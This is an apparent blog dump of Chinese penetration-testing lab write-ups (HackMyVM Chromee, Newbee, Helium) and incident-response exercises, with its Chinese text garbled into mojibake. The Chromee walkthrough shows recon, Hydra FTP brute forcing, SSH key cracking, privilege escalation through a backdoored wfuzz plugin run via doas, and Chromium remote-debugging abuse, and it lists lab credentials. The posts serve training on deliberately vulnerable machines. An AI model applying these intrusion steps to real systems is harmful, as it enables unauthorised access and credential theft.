hash mode.The following mode was auto-detected as the only one matching your input hash:10900 | PBKDF2-HMAC-SHA256 | Generic KDFNOTE: Auto-detect is best effort. The correct hash-mode is NOT guaranteed!Do NOT report auto-detect issues unless you are certain of the hash type.Minimum password length supported by kernel: 0Maximum password length supported by kernel: 256INFO: All hashes found as potfile and/or empty entries! Use --show to display them.Started: Wed Mar 26 08:49:58 2025Stopped: Wed Mar 26 08:49:59 2025â”Œâ”€â”€(rootã‰¿kali)-[~/Desktop/tmp]â””â”€# hashcat ./2 --showHash-mode was not specified with -m. Attempting to auto-detect hash mode.The following mode was auto-detected as the only one matching your input hash:10900 | PBKDF2-HMAC-SHA256 | Generic KDFNOTE: Auto-detect is best effort. The correct hash-mode is NOT guaranteed!Do NOT report auto-detect issues unless you are certain of the hash type.sha256:50500:i/PjRSt4VE+L7pQA1pNtNA==:LAguP/LKFeOyT4FdcGU/DerQlTRJUGndFA4ZrbLRFyZsxLHeja9Vx8SCegpcz3DG9Tf/xN3HTbSGXEHA:1qaz2wsx ç”¨æˆ·homeç›®å½•ä¸‹è¿˜æœ‰ä¸€ä¸ª.secretç›®å½•ï¼Œé‡Œé¢æœ‰ä¸€ä¸ªå¯†ç çš„å‹ç¼©åŒ… 1234567debian@Newbee:~$ cd .secret/debian@Newbee:~/.secret$ lshint.txt password.zipdebian@Newbee:~/.secret$ cat hint.txtpassword is md5(key)and key is in mysql!!!!!! å¯†ç æ˜¯1qaz2wsxçš„md5 å›¾ç‰‡æ˜¯é©¬èµ›å…‹ï¼Œç½‘ä¸Šæœ‰ä¸€ä¸ªé¡¹ç›®æ˜¯ç”¨æ¥æ¢å¤é©¬èµ›å…‹çš„ https://github.com/spipm/Depixelization_poc å…¶å®ä¹Ÿä¸ç”¨è·‘ï¼Œå›¾ç‰‡çš„åŸå›¾å°±æ˜¯è¿™ä¸ªé¡¹ç›®çš„ç¤ºä¾‹å›¾ç‰‡ å¯†ç æ˜¯hellofromtheotherside 123debian@Newbee:/tmp$ su - rootPassword:root@Newbee:~#","categories":[{"name":"HackMyVM","slug":"HackMyVM","permalink":"https://lvzhouhang.xyz/categories/HackMyVM/"}],"tags":[{"name":"é¶æœº","slug":"é¶æœº","permalink":"https://lvzhouhang.xyz/tags/%E9%9D%B6%E6%9C%BA/"}]},{"title":"HackmyVM-Chromee","slug":"Chromee","date":"2025-03-21T11:11:42.000Z","updated":"2025-04-19T13:25:36.810Z","comments":true,"path":"2025/03/21/Chromee/","permalink":"https://lvzhouhang.xyz/2025/03/21/Chromee/","excerpt":"","text":"ä¿¡æ¯æœé›†arp-scan -l 12345678910â”Œâ”€â”€(rootã‰¿kali)-[~/Desktop/tmp]â””â”€# arp-scan -lInterface: eth0, type: EN10MB, MAC: 00:0c:29:ff:66:80, IPv4: 192.168.31.129Starting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)192.168.31.1 0a:00:27:00:00:11 (Unknown: locally administered)192.168.31.2 08:00:27:01:8c:4d PCS Systemtechnik GmbH192.168.31.100 08:00:27:f9:e1:65 PCS Systemtechnik GmbH3 packets received by filter, 0 packets dropped by kernelEnding arp-scan 1.10.0: 256 hosts scanned in 2.402 seconds (106.58 hosts/sec). 3 responded ipä¸º192.168.31.100,ç„¶åç”¨nmapæ‰«æç«¯å£ 123456789101112131415â”Œâ”€â”€(rootã‰¿kali)-[~/Desktop/tmp]â””â”€# nmap 192.168.31.100 -p-Starting Nmap 7.95 ( https://nmap.org ) at 2025-03-21 07:14 EDTNmap scan report for chromee.hmv (192.168.31.100)Host is up (0.0019s latency).Not shown: 65531 closed tcp ports (reset)PORT STATE SERVICE22/tcp open ssh80/tcp open http8080/tcp open http-proxy23333/tcp open elxmgmtMAC Address: 08:00:27:F9:E1:65 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)Nmap done: 1 IP address (1 host up) scanned in 7.02 seconds 80ç«¯å£gobusteræ‰«æç›®å½• 1234567891011121314151617181920â”Œâ”€â”€(rootã‰¿kali)-[~/Desktop/tmp]â””â”€# gobuster dir -u &quot;http://192.168.31.100&quot; -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -x .txt,.php===============================================================Gobuster v3.6by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)===============================================================[+] Url: http://192.168.31.100[+] Method: GET[+] Threads: 10[+] Wordlist: /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt[+] Negative Status codes: 404[+] User Agent: gobuster/3.6[+] Extensions: txt,php[+] Timeout: 10s===============================================================Starting gobuster in directory enumeration mode===============================================================/post.php (Status: 200) [Size: 3]/secret.php (Status: 200) [Size: 549] æœ‰ä¸€ä¸ªpost.phpå’Œsecret.php,secret.phpä¸ä¼šè§£ææˆphpä¼šç›´æ¥ä¸‹è½½ä¸‹æ¥ 1234567891011121314151617181920212223#secret.php&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt; &lt;title&gt;Secret&lt;/title&gt;&lt;/head&gt;&lt;body&gt; &lt;?php $greeting = date(&#x27;H&#x27;) &lt; 12 ? &#x27;æ—©ä¸Šå¥½&#x27; : (date(&#x27;H&#x27;) &lt; 18 ? &#x27;ä¸‹åˆå¥½&#x27; : &#x27;æ™šä¸Šå¥½&#x27;); $visitorIP = htmlspecialchars($_SERVER[&#x27;REMOTE_ADDR&#x27;]); echo &quot;&lt;h1&gt;&#123;$greeting&#125;ï¼Œadriana&lt;/h1&gt;&quot;; echo &quot;&lt;p&gt;å½“å‰æ—¶é—´ï¼š&quot; . date(&#x27;Y-m-d H:i:s&#x27;) . &quot;&lt;/p&gt;&quot;; echo &quot;&lt;p&gt;ä½ çš„IPï¼š&#123;$visitorIP&#125;&lt;/p&gt;&quot;; if (isset($_GET[&#x27;aaa&#x27;])) &#123; $file_content = file_get_contents(&#x27;/opt/note/dic.txt&#x27;); echo $file_content; &#125; else &#123; die(); &#125; ?&gt;&lt;/body&gt;&lt;/html&gt; 8080ç«¯å£å…ˆç”¨gobusteræ‰«æä¸€ä¸‹ç›®å½• 1234567891011121314151617181920â”Œâ”€â”€(rootã‰¿kali)-[~/Desktop/tmp]â””â”€# gobuster dir -u &quot;http://192.168.31.100:8080&quot; -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt===============================================================Gobuster v3.6by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)===============================================================[+] Url: http://192.168.31.100:8080[+] Method: GET[+] Threads: 10[+] Wordlist: /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt[+] Negative Status codes: 404[+] User Agent: gobuster/3.6[+] Timeout: 10s===============================================================Starting gobuster in directory enumeration mode===============================================================/javascript (Status: 301) [Size: 328] [--&gt; http://192.168.31.100:8080/javascript/]/silence (Status: 403) [Size: 281]/server-status (Status: 403) [Size: 281] æœ‰ä¸€ä¸ªsilenceï¼Œè®¿é—®å‘ç°Forbiddenäº† ç”¨bpçš„BypassProæ’ä»¶å‘ç°æ¢ä¸€ç§è¯·æ±‚ä¼šå˜æˆ301ï¼Œæ„Ÿè§‰æœ‰é—®é¢˜ï¼Œåé¢æ·»åŠ ä¸€ä¸ªindex.htmlå‘ç°ç»•è¿‡äº† æœ‰ä¸€ä¸ªé‚®ç®±ï¼Œå°†è¿™ä¸ªåŸŸåæ·»åŠ è¿›hostsé‡Œï¼Œå†å»è®¿é—®http://chromee.hmv/secret.phpå‘ç°secret.phpè§£æäº†ï¼ŒGETä¼ å…¥aaa=1 123456ä¸‹åˆå¥½ï¼Œadrianaå½“å‰æ—¶é—´ï¼š2025-03-21 12:28:34ä½ çš„IPï¼š192.168.31.1The Lost Key Lily, a curious girl, found an old rusty key in the woods. Wondering where it belonged, she asked everyone in the village, but no one knew. One day, she discovered a locked stone well. To her surprise, the key fit. She opened it and descended into a hidden passage. There, she found an ancient chest filled with treasures. But the real treasure was a note inside: â€œThe greatest treasure is the journey, not the prize.â€ Lily smiled, realizing the adventure was the real reward. è¿™é‡Œæœ‰ä¸¤ä¸ªäººåï¼Œadrianaå’ŒLilyï¼Œç”¨cuppå„ç”Ÿæˆä¸€ä¸ªå­—å…¸ï¼Œç„¶åå°†ä¸¤ä¸ªå­—å…¸åˆå¹¶çˆ†ç ´ftp(23333ç«¯å£) 1234567891011â”Œâ”€â”€(rootã‰¿kali)-[~/Desktop/tmp/test]â””â”€# hydra -L ./name -P ./pass 192.168.31.100 ftp -s 23333 -f -t 50Hydra v9.5 (c) 2023 by van Hauser/THC &amp; David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-03-21 07:32:30[DATA] max 50 tasks per 1 server, overall 50 tasks, 208 login tries (l:2/p:104), ~5 tries per task[DATA] attacking ftp://192.168.31.100:23333/[23333][ftp] host: 192.168.31.100 login: adriana password: Lily2020[STATUS] attack finished for 192.168.31.100 (valid pair found)1 of 1 target successfully completed, 1 valid password foundHydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-03-21 07:32:31 çˆ†ç ´å‡ºäº†è´¦å·å¯†ç  1234567891011121314151617â”Œâ”€â”€(rootã‰¿kali)-[~/Desktop/tmp/test]â””â”€# ftp adriana@192.168.31.100 23333Connected to 192.168.31.100.220 (vsFTPd 3.0.3)331 Please specify the password.Password:230 Login successful.Remote system type is UNIX.Using binary mode to transfer files.ftp&gt; ls -al229 Entering Extended Passive Mode (|||20808|)150 Here comes the directory listing.drwxr-xr-x 2 106 115 4096 Mar 09 08:13 .drwxr-xr-x 4 0 0 4096 Mar 09 08:12 ..-rw-r--r-- 1 0 0 3414 Mar 09 08:13 ...-rw-r--r-- 1 0 0 495 Mar 07 14:40 dic.txt226 Directory send OK. è¿™æœ‰â€¦æ–‡ä»¶ï¼Œä¸€å¼€å§‹ä»¥ä¸ºæ˜¯ä¸€ä¸ªç›®å½•ï¼Œcdä¸è¿›å»ï¼Œä¹Ÿä¸çœ‹æŠ¥é”™å°±æ²¡ç®¡äº†(å”‰ï¼Œç»†èŠ‚å†³å®šæˆè´¥)å¯¼è‡´å¡äº†å¥½é•¿æ—¶é—´ï¼Œä½†æ˜¯å¡çš„æ—¶å€™ä¹Ÿæ²¡æœ‰è’åºŸï¼Œåœ¨/srvç›®å½•ä¸‹æœ‰ä¸€ä¸ªzeus.confï¼Œåé¢ææƒè¦ç”¨åˆ° 12345â”Œâ”€â”€(rootã‰¿kali)-[~/Desktop/tmp/test]â””â”€# cat zeus.confpermit follower as softly cmd /usr/local/bin/wfuzzpermit nopass :softly as root cmd /usr/bin/chromiumpermit nopass :softly as root cmd /usr/bin/kill 12345678ftp&gt; cd /home250 Directory successfully changed.ftp&gt; ls229 Entering Extended Passive Mode (|||5941|)150 Here comes the directory listing.drwxr-x--- 5 1000 1000 4096 Mar 21 08:18 followerdrwxr-x--- 5 1001 1001 4096 Mar 21 05:37 softly226 Directory send OK. è¿˜å¯ä»¥çŸ¥é“ç”¨æˆ·å â€¦æ–‡ä»¶æ˜¯ä¸€ä¸ªç§é’¥ï¼Œjohnå¯ä»¥çˆ†ç ´å‡ºæ¥å¯†ç  123â”Œâ”€â”€(rootã‰¿kali)-[~/Desktop/tmp/test]â””â”€# john 1 --showid:cassandra 1234â”Œâ”€â”€(rootã‰¿kali)-[~/Desktop/tmp/test]â””â”€# ssh follower@192.168.31.100 -i idEnter passphrase for key &#x27;id&#x27;:follower@Chromee:~$ ææƒfollowerä¸‹æœ‰ä¸€ä¸ªcat.gitå’Œnote.txt 12345follower@Chromee:~$ cat note.txtThink about rotations and the catâ€™s secrets.47 is not just a number, it&#x27;s a twist of fate. è¿™ä¸ª47æç¤ºçš„å¾ˆæ˜æ˜¾æ˜¯rot47 cat.gifç”¨convertå¯ä»¥åˆ†ç¦»å‡ºæ¥12å¼ å›¾ç‰‡ï¼Œä½†æ˜¯æ²¡æœ‰ç”¨ 1convert cat.gif 1.jpg ä¸æ˜¯ç©ºé—´è½´å¯ä»¥è¯•è¯•æ—¶é—´è½´ 123â”Œâ”€â”€(rootã‰¿kali)-[~/Desktop/tmp/test]â””â”€# identify -format &quot;%T &quot; cat.gif65 98 65 100 102 98 67 6 6 6 6 6 6 å°†åé¢çš„6ä¸ª6å»æ‰æ‰”è¿›cyberchefä¸­è§£å¯†ç„¶årot47è§£å¯† å¾—åˆ°äº†p3p573rï¼Œå› ä¸ºå‰é¢æ‹¿åˆ°çš„zeus.confèƒ½å¤ŸçŸ¥é“followeréœ€è¦å¯†ç æ‰èƒ½ä»¥softlyæ‰§è¡Œwfuzz å…ˆç”¨findæ‰¾åˆ°wfuzzçš„è·¯å¾„ 1234follower@Chromee:/usr/local/lib/python3.9/dist-packages/wfuzz$ find / -name &quot;wfuzz&quot; 2&gt;/dev/null/home/follower/.config/wfuzz/usr/local/bin/wfuzz/usr/local/lib/python3.9/dist-packages/wfuzz #è¿™ä¸ªå°±æ˜¯wfuzzçš„è·¯å¾„ 12follower@Chromee:/usr/local/lib/python3.9/dist-packages/wfuzz$ find ./ -writable 2&gt;/dev/null./plugins/payloads/file.py åœ¨ä»–çš„wfuzzçš„ç›®å½•ä¸‹æ‰¾å¯ä»¥å†™çš„æ–‡ä»¶èƒ½æ‰¾åˆ°file.py,catä¸€ä¸‹ 123follower@Chromee:/usr/local/lib/python3.9/dist-packages/wfuzz$ cat ./plugins/payloads/file.pyimport ptypty.spawn(&quot;/bin/bash&quot;) ä¸ç”¨æƒ³äº†ï¼Œè‚¯å®šæ˜¯ä½œè€…é™ä½éš¾åº¦äº†åé—¨éƒ½ç•™å¥½äº† 1234follower@Chromee:~$ /usr/local/bin/doas -u softly /usr/local/bin/wfuzz -z file -u &quot;127.0.0.1&quot;Password: /usr/local/lib/python3.9/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz&#x27;s documentation for more information.softly@Chromee:/home/follower$ ä¸Šä¼ pspy64ï¼Œèƒ½å‘ç°æ¯éš”ä¸€æ®µæ—¶é—´rootç”¨æˆ·éƒ½ä¼šæ‰§è¡Œsecript.sh 122025/03/21 12:53:01 CMD: UID=0 PID=1504 | /bin/sh -c /root/script.sh2025/03/21 12:53:01 CMD: UID=0 PID=1505 | /bin/bash /root/script.sh ç»“åˆé¢˜ç›®åChromeeå’Œå‰é¢å¾—åˆ°çš„zeus.confï¼Œèƒ½çŒœåˆ°è‚¯å®šå’Œæµè§ˆå™¨æœ‰å…³ç³»ï¼Œè¿è¡Œlinpeas.shèƒ½çœ‹åˆ°/mediaä¸‹æœ‰ä¸€ä¸ªdebug.kdbx 123â”Œâ”€â”€(rootã‰¿kali)-[~/Desktop/tmp/test]â””â”€# file debug.kdbxdebug.kdbx: PDF document, version 1.7 æ˜¯ä¸€ä¸ªpdfæ–‡ä»¶ å»ç½‘ä¸ŠæŸ¥è¿™ä¸ªä¸œè¥¿ï¼Œè°·æ­Œæµè§ˆå™¨è‡ªå¸¦è¿™ä¸ªå·¥å…·chrome://inspect/ï¼Œè¿˜æœ‰è¿™ä¸ª9222çš„é»˜è®¤ç«¯å£ï¼ˆåé¢è¦ç”¨åˆ°ï¼‰ å…ˆå†™ä¸€ä¸ªauthorized_keys åœ¨ç½‘ä¸ŠæŸ¥åˆ°å¼€å¯è¿œç¨‹debugçš„å‘½ä»¤ 1doas /usr/bin/chromium --headless --remote-debugging-port=9222 --no-sandbox http://127.0.0.1 å› ä¸ºé¶æœºæ²¡æœ‰æ¡Œé¢ï¼Œæ‰€ä»¥ä¸€å®šè¦å¸¦ä¸Šâ€“headlessï¼Œä¸ç„¶ä¼šæŠ¥é”™ï¼Œå¯åŠ¨å¥½åå†ç”¨socatç«¯å£è½¬å‘ 1softly@Chromee:~$ ./socatx64.bin TCP-LISTEN:9999,fork TCP4:127.0.0.1:9222 ç”¨è°·æ­Œæµè§ˆå™¨è¿æ¥ï¼Œæ‰“å¼€ç¬¬ä¸€ä¸ªè¿æ¥ ç­‰ä¸€ä¼šå°±ä¼šå‘ç°å‘127.0.0.1/post.phpå‘é€ä¸€ä¸ªkeyï¼Œä¸ç”¨base64è§£ç ï¼Œè¿™ä¸ªå°±æ˜¯rootçš„å¯†ç ã€‚ chromiumçš„è¿œç¨‹ç«¯å£å¿…é¡»è¦æ˜¯9222é»˜è®¤ç«¯å£å¦åˆ™ä»–ç›‘å¬ä¸åˆ°å°±å¾ˆéš¾å—","categories":[{"name":"HackMyVM","slug":"HackMyVM","permalink":"https://lvzhouhang.xyz/categories/HackMyVM/"}],"tags":[{"name":"é¶æœº","slug":"é¶æœº","permalink":"https://lvzhouhang.xyz/tags/%E9%9D%B6%E6%9C%BA/"}]},{"title":"åº”æ€¥å“åº”é¶æœºè®­ç»ƒ-Web3","slug":"åº”æ€¥å“åº”é¶æœºè®­ç»ƒ-Web3","date":"2025-02-18T12:02:58.000Z","updated":"2025-04-19T13:25:36.771Z","comments":true,"path":"2025/02/18/åº”æ€¥å“åº”é¶æœºè®­ç»ƒ-Web3/","permalink":"https://lvzhouhang.xyz/2025/02/18/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E9%9D%B6%E6%9C%BA%E8%AE%AD%E7%BB%83-Web3/","excerpt":"","text":"éšè—ç”¨æˆ·åç§° è¿™è¿˜æ²¡å¼€å§‹ç¬¬ä¸€é“é¢˜å°±å·²ç»ç»“æŸäº† æ”»å‡»è€…çš„ä¸¤ä¸ªIPåœ°å€ è¿œç¨‹ç™»å½•æ‰¾åˆ°ä¸€ä¸ªip åœ¨hackerçš„ç›®å½•ä¸‹èƒ½æ‰¾åˆ°ä¸€ä¸ªsystem.batçš„æ–‡ä»¶ï¼Œå¯ä»¥çœ‹åˆ°å‘webé‡Œé¢å†™äº†ä¸€ä¸ªwebshellï¼Œå¯ä»¥å»æŸ¥çœ‹apacheçš„æ—¥å¿— è¿˜æœ‰ç¬¬ä¸€ä¸ªflag ç¬¬äºŒä¸ªIP é»‘å®¢é—ç•™ä¸‹çš„flagã€3ä¸ªã€‘ è®¡åˆ’ä»»åŠ¡é‡Œæœ‰ä¸€ä¸ªflag å¯ä»¥çœ‹åˆ°webæ˜¯ä¸€ä¸ªZ-blogï¼Œå»å®˜ç½‘ä¸‹è½½ä¸€ä¸ªä¿®æ”¹åå°å¯†ç çš„å·¥å…· https://bbs.zblogcn.com/thread-83419.html å¯ä»¥çœ‹åˆ°è¿˜æœ‰ä¸€ä¸ªhackerç”¨æˆ· ç¬¬ä¸‰ä¸ªflag","categories":[{"name":"åº”æ€¥å“åº”","slug":"åº”æ€¥å“åº”","permalink":"https://lvzhouhang.xyz/categories/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/"}],"tags":[{"name":"é¶æœº","slug":"é¶æœº","permalink":"https://lvzhouhang.xyz/tags/%E9%9D%B6%E6%9C%BA/"}]},{"title":"åº”æ€¥å“åº”é¶æœºè®­ç»ƒ-Web2","slug":"åº”æ€¥å“åº”é¶æœºè®­ç»ƒ-Web2","date":"2025-02-08T07:41:44.000Z","updated":"2025-04-19T13:25:36.771Z","comments":true,"path":"2025/02/08/åº”æ€¥å“åº”é¶æœºè®­ç»ƒ-Web2/","permalink":"https://lvzhouhang.xyz/2025/02/08/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E9%9D%B6%E6%9C%BA%E8%AE%AD%E7%BB%83-Web2/","excerpt":"","text":"1.æ”»å‡»è€…çš„IPåœ°å€ï¼ˆä¸¤ä¸ªï¼‰ï¼Ÿ ç¬¬ä¸€ä¸ªipåœ¨apacheçš„æ—¥å¿—é‡Œï¼Œå¦ä¸€ä¸ªæ˜¯ç™»å½•æ—¥å¿—å¯ä»¥ç›´æ¥ç”¨å·¥å…·windows1checkæˆ–è€…äº‹ä»¶æŸ¥çœ‹å™¨é‡ŒæŸ¥æ‰¾ 2.æ”»å‡»è€…çš„webshellæ–‡ä»¶åï¼Ÿ æŸ¥çœ‹apacheçš„æ—¥å¿—å‘ç°system.phpæ˜¯webshellçš„æ–‡ä»¶å 3.æ”»å‡»è€…çš„webshellå¯†ç ï¼Ÿå¯†ç æ˜¯hcak6618 4.æ”»å‡»è€…çš„ä¼ªQQå·ï¼Ÿ ä¼—æ‰€å‘¨çŸ¥ï¼Œqqç™»é™†è¿‡åä¼šé»˜è®¤ä¼šåœ¨æ–‡æ¡£é‡Œåˆ›å»ºä¸€ä¸ªTencent Fileé‡Œé¢ä¼šè®°å½•æ¯ä¸ªç™»é™†è¿‡çš„qqå·ï¼Œåœ¨FileRecvé‡Œæ˜¯é€šè¿‡qqä¸‹è½½çš„æ–‡ä»¶ 5.æ”»å‡»è€…çš„ä¼ªæœåŠ¡å™¨IPåœ°å€ï¼Ÿ é»‘å®¢é€šè¿‡qqä¸‹è½½äº†ä¸€ä¸ªfrpï¼Œåœ¨frpcçš„é…ç½®æ–‡ä»¶é‡Œæœ‰ä¼ªæœåŠ¡å™¨IPå’Œç«¯å£ 6.æ”»å‡»è€…çš„æœåŠ¡å™¨ç«¯å£ï¼Ÿ65536 7.æ”»å‡»è€…æ˜¯å¦‚ä½•å…¥ä¾µçš„ï¼ˆé€‰æ‹©é¢˜ï¼‰ï¼Ÿ é€šè¿‡åˆ†æftpçš„æ—¥å¿—æ–‡ä»¶å¯ä»¥å‘ç°ï¼Œæ”»å‡»è€…é€šè¿‡çˆ†ç ´ftp adminçš„å¯†ç ç™»å½•æˆåŠŸï¼Œç„¶åä¸Šä¼ system.phpæ–‡ä»¶ çœ‹phpstudyçš„ftpé…ç½®å¯ä»¥å‘ç°ftpçš„æ ¹ç›®å½•åœ¨wwwç›®å½•ï¼Œæ‰€ä»¥ä¸Šä¼ çš„system.phpå¯ä»¥è®¿é—®åˆ° 8.æ”»å‡»è€…çš„éšè—ç”¨æˆ·åï¼Ÿ å­¦åˆ°æ–°æ‹›ï¼Œwin+r-&gt;cmd-&gt;lusrmgr.mscå¯ä»¥æŸ¥çœ‹æœ¬åœ°ç”¨æˆ·å’Œç»„ï¼Œæˆ–è€…Cç›˜USERèƒ½æ‰¾åˆ°hack887$","categories":[{"name":"åº”æ€¥å“åº”","slug":"åº”æ€¥å“åº”","permalink":"https://lvzhouhang.xyz/categories/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/"}],"tags":[{"name":"é¶æœº","slug":"é¶æœº","permalink":"https://lvzhouhang.xyz/tags/%E9%9D%B6%E6%9C%BA/"}]},{"title":"åº”æ€¥å“åº”é¶æœºè®­ç»ƒ-Web1","slug":"åº”æ€¥å“åº”é¶æœºè®­ç»ƒ-Web1","date":"2025-02-07T04:10:42.000Z","updated":"2025-04-19T13:25:36.771Z","comments":true,"path":"2025/02/07/åº”æ€¥å“åº”é¶æœºè®­ç»ƒ-Web1/","permalink":"https://lvzhouhang.xyz/2025/02/07/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E9%9D%B6%E6%9C%BA%E8%AE%AD%E7%BB%83-Web1/","excerpt":"","text":"123456å‰æ™¯éœ€è¦ï¼šå°æåœ¨å€¼å®ˆçš„è¿‡ç¨‹ä¸­ï¼Œå‘ç°æœ‰CPUå ç”¨é£™å‡ï¼Œå‡ºäºèƒ†å­å°ï¼Œå°±ç«‹åˆ»å°†æœåŠ¡å™¨å…³æœºï¼Œå¹¶æ‰¾æ¥æ­£åœ¨åƒè‹•çš®çš„hxdå¸®ä»–åˆ†æï¼Œè¿™æ˜¯ä»–çš„æœåŠ¡å™¨ç³»ç»Ÿï¼Œè¯·ä½ æ‰¾å‡ºä»¥ä¸‹å†…å®¹ï¼Œå¹¶ä½œä¸ºé€šå…³æ¡ä»¶ï¼š1.æ”»å‡»è€…çš„shellå¯†ç 2.æ”»å‡»è€…çš„IPåœ°å€3.æ”»å‡»è€…çš„éšè—è´¦æˆ·åç§°4.æ”»å‡»è€…æŒ–çŸ¿ç¨‹åºçš„çŸ¿æ± åŸŸå(ä»…åŸŸå)5.æœ‰å®åŠ›çš„å¯ä»¥å°è¯•ç€ä¿®å¤æ¼æ´ 1.æ”»å‡»è€…çš„shellå¯†ç æ‰“å¼€phpstudyæ‰¾åˆ°ç½‘ç«™çš„æ ¹ç›®å½•ï¼Œç„¶åç”¨Dç›¾æ‰« èƒ½æ‰¾åˆ°æ˜¯ä¸€ä¸ªå†°èé©¬ï¼Œå¯†ç æ˜¯rebeyond 2.æ”»å‡»è€…çš„IPåœ°å€æŸ¥çœ‹phpstudyçš„æ—¥å¿—æ–‡ä»¶ï¼Œæœ‰apacheå’Œnginxï¼Œnginxçš„æ—¥å¿—å…¨æ˜¯0kbï¼Œæ‰“å¼€apacheçš„access.logæ–‡ä»¶æœç´¢shell.phpèƒ½æ‰¾åˆ°æ”»å‡»è€…çš„ip 3.æ”»å‡»è€…çš„éšè—è´¦æˆ·åç§°å¯ä»¥ç›´æ¥æŸ¥çœ‹Cç›˜çš„ç”¨æˆ·æœ‰ä¸€ä¸ªhack168$ æˆ–è€…å¯ä»¥æŸ¥çœ‹ç™»å½•çš„æ—¥å¿—ï¼Œå¦‚æœä¸ç”¨å·¥å…·çš„è¯å°±åœ¨äº‹ä»¶æŸ¥çœ‹å™¨é‡Œ-å®‰å…¨æ‰¾äº‹ä»¶IDä¸º4624çš„äº‹ä»¶ 4.æ”»å‡»è€…æŒ–çŸ¿ç¨‹åºçš„çŸ¿æ± åŸŸå(ä»…åŸŸå)åœ¨C:\\Users\\hack168$\\Desktopé‡Œæœ‰ä¸€ä¸ªKuangï¼Œè¿™æ˜¯ä¸€ä¸ªpythonç¼–è¯‘çš„exeæ–‡ä»¶ï¼Œå…ˆè½¬ä¸€ä¸‹pycç„¶ååç¼–è¯‘å°±è¡Œäº† 5.æœ‰å®åŠ›çš„å¯ä»¥å°è¯•ç€ä¿®å¤æ¼æ´phpstudyå°†webæœåŠ¡å¯åŠ¨ï¼Œæ˜¯ä¸€ä¸ªEMGLOGæœåŠ¡ï¼Œåå°çš„è´¦å·å¯†ç æ˜¯admin/123456 https://blog.csdn.net/W13680336969/article/details/137267677 æ‰“ä¸Šæœ€æ–°çš„è¡¥ä¸ï¼Œå¹¶æŠŠadminçš„å¯†ç æ”¹æ‰ 6.éé¢„æœŸæ¡Œé¢ä¸Šæœ‰ä¸€ä¸ªè§£ä½“çš„æ ¡éªŒç¨‹åºï¼Œå’Œkuangä¸€æ ·ï¼Œexe-&gt;pycç„¶ååç¼–è¯‘","categories":[{"name":"åº”æ€¥å“åº”","slug":"åº”æ€¥å“åº”","permalink":"https://lvzhouhang.xyz/categories/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/"}],"tags":[{"name":"é¶æœº","slug":"é¶æœº","permalink":"https://lvzhouhang.xyz/tags/%E9%9D%B6%E6%9C%BA/"}]},{"title":"HackmyVM-Helium","slug":"HackmyVM-Helium","date":"2025-01-26T06:26:29.000Z","updated":"2025-04-19T13:25:36.810Z","comments":true,"path":"2025/01/26/HackmyVM-Helium/","permalink":"https://lvzhouhang.xyz/2025/01/26/HackmyVM-Helium/","excerpt":"","text":"ä¿¡æ¯æœé›†123456789101112â”Œâ”€â”€(rootã‰¿kali)-[~/Desktop/tmp]â””â”€# arp-scan -lInterface: eth0, type: EN10MB, MAC: 00:0c:29:7d:7d:cf, IPv4: 192.168.31.129Starting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)192.168.31.1 a4:a9:30:df:ef:44 (Unknown)192.168.31.178 08:00:27:d1:eb:7a PCS Systemtechnik GmbH192.168.31.220 46:3e:62:f9:1e:fa (Unknown: locally administered)192.168.31.217 b4:0f:b3:8e:31:07 vivo Mobile Communication Co., Ltd.192.168.31.85 7e:2c:58:df:4e:cb (Unknown: locally administered)5 packets received by filter, 0 packets dropped by kernelEnding arp-scan 1.10.0: 256 hosts scanned in 2.000 seconds (128.00 hosts/sec). 5 responded ipæ˜¯192.168.31.178ï¼Œnmapæ‰«æä¸€ä¸‹ç«¯å£ 123456789101112â”Œâ”€â”€(rootã‰¿kali)-[~/Desktop/tmp]â””â”€# nmap 192.168.31.178 --min-rate=1000 -p-Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-01-26 01:27 ESTNmap scan report for helium (192.168.31.178)Host is up (0.0046s latency).Not shown: 65533 closed tcp ports (reset)PORT STATE SERVICE22/tcp open ssh80/tcp open httpMAC Address: 08:00:27:D1:EB:7A (Oracle VirtualBox virtual NIC)Nmap done: 1 IP address (1 host up) scanned in 20.85 seconds 80ç«¯å£123456789101112131415161718192021222324â”Œâ”€â”€(rootã‰¿kali)-[~/Desktop/tmp]â””â”€# curl 192.168.31.178&lt;title&gt;RELAX&lt;/title&gt;&lt;!doctype html&gt;&lt;html lang=&quot;en&quot;&gt;&lt;!-- Please paul, stop uploading weird .wav files using /upload_sound --&gt;&lt;head&gt;&lt;style&gt;body &#123; background-image: url(&#x27;screen-1.jpg&#x27;); background-repeat: no-repeat; background-attachment: fixed; background-size: 100% 100%;&#125;&lt;/style&gt; &lt;link href=&quot;bootstrap.min.css&quot; rel=&quot;stylesheet&quot;&gt; &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1&quot;&gt;&lt;/head&gt;&lt;body&gt;&lt;audio src=&quot;relax.wav&quot; preload=&quot;auto loop&quot; controls&gt;&lt;/audio&gt;&lt;/body&gt; 